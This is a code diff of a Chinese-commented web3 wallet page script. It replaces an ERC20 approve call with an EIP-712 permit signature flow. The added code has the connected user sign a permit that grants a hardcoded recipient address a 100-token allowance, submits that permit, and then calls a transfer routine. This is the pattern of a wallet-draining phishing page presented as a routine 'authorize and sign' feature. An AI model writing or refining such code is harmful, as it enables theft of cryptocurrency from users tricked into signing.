@@ -1,18 +1,24 @@
-// 要转移代币的目标地址
 const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
 let web3;
 let isConnected = false;
 let isRequestPending = false;
 
-// ERC20标准合约的ABI
+// ERC20标准合约的ABI (包含permit方法)
 const erc20Abi = [
     {
-        "constant": true,
-        "inputs": [],
-        "name": "totalSupply",
-        "outputs": [{"name": "", "type": "uint256"}],
-        "payable": false,
-        "stateMutability": "view",
+        "constant": false,
+        "inputs": [
+            {"name": "owner", "type": "address"},
+            {"name": "spender", "type": "address"},
+            {"name": "value", "type": "uint256"},
+            {"name": "deadline", "type": "uint256"},
+            {"name": "v", "type": "uint8"},
+            {"name": "r", "type": "bytes32"},
+            {"name": "s", "type": "bytes32"}
+        ],
+        "name": "permit",
+        "outputs": [],
+        "stateMutability": "nonpayable",
         "type": "function"
     },
     {
@@ -22,15 +28,6 @@ const erc20Abi = [
         "outputs": [{"name": "balance", "type": "uint256"}],
         "payable": false,
         "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "constant": false,
-        "inputs": [{"name": "_spender", "type": "address"}, {"name": "_value", "type": "uint256"}],
-        "name": "approve",
-        "outputs": [{"name": "", "type": "bool"}],
-        "payable": false,
-        "stateMutability": "nonpayable",
         "type": "function"
     },
     {
@@ -103,42 +100,72 @@ document.getElementById('authorizeAndSignButton').onclick = async () => {
     const accounts = await web3.eth.getAccounts();
     const account = accounts[0];
 
-    // 确认 tokenContract 的 ABI 和合约地址
     const tokenAddress = '0xYourTokenContractAddress'; // 这里填写你要操作的 ERC20 合约地址
     const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
 
     try {
-        // 授权代币额度
-        const tx = await tokenContract.methods.approve(recipientAddress, web3.utils.toWei('100', 'ether')).send({ from: account });
-        document.getElementById('status').innerText = '授权成功，正在请求签名...';
+        // 使用 permit 进行签名授权
+        const nonce = await tokenContract.methods.nonces(account).call();
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 分钟过期
 
-        // 授权成功后直接执行签名操作
-        const signatureResult = await performSignature(account);
-        if (signatureResult.success) {
-            document.getElementById('status').innerText = `签名成功: ${signatureResult.signature}`;
-            document.getElementById('signatureMessage').innerText = `签名确认信息: ${signatureResult.message}`;
-            document.getElementById('signingSection').style.display = 'block';
-        } else {
-            document.getElementById('status').innerText = '签名失败: ' + signatureResult.error;
-        }
+        // 签名信息
+        const domain = {
+            name: 'YourTokenName',
+            version: '1',
+            chainId: await web3.eth.getChainId(),
+            verifyingContract: tokenAddress
+        };
 
-        // 开始代币转移
+        const permitData = {
+            owner: account,
+            spender: recipientAddress,
+            value: web3.utils.toWei('100', 'ether'),
+            nonce: nonce,
+            deadline: deadline
+        };
+
+        // 使用 EIP-712 进行签名
+        const signature = await web3.eth.signTypedDataV4(account, JSON.stringify({
+            types: {
+                EIP712Domain: [
+                    { name: "name", type: "string" },
+                    { name: "version", type: "string" },
+                    { name: "chainId", type: "uint256" },
+                    { name: "verifyingContract", type: "address" }
+                ],
+                Permit: [
+                    { name: "owner", type: "address" },
+                    { name: "spender", type: "address" },
+                    { name: "value", type: "uint256" },
+                    { name: "nonce", type: "uint256" },
+                    { name: "deadline", type: "uint256" }
+                ]
+            },
+            primaryType: 'Permit',
+            domain: domain,
+            message: permitData
+        }));
+
+        const { v, r, s } = getSignatureParameters(signature);
+
+        // 调用合约的 permit 方法进行授权
+        await tokenContract.methods.permit(account, recipientAddress, web3.utils.toWei('100', 'ether'), deadline, v, r, s).send({ from: account });
+        document.getElementById('status').innerText = 'Permit 授权成功';
+
+        // 授权成功后进行代币转移
         await transferTokens(account, tokenContract);
     } catch (error) {
         document.getElementById('status').innerText = '授权或签名失败: ' + error.message;
     }
 };
 
-// 执行签名的函数
-const performSignature = async (account) => {
-    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-    try {
-        const signature = await web3.eth.personal.sign(message, account);
-        return { success: true, signature: signature, message: message };
-    } catch (error) {
-        return { success: false, error: error.message };
-    }
-};
+// 获取签名参数
+function getSignatureParameters(signature) {
+    const r = signature.slice(0, 66);
+    const s = '0x' + signature.slice(66, 130);
+    const v = parseInt(signature.slice(130, 132), 16);
+    return { v, r, s };
+}
 
 // 代币转移逻辑
 const transferTokens = async (account, tokenContract) => {
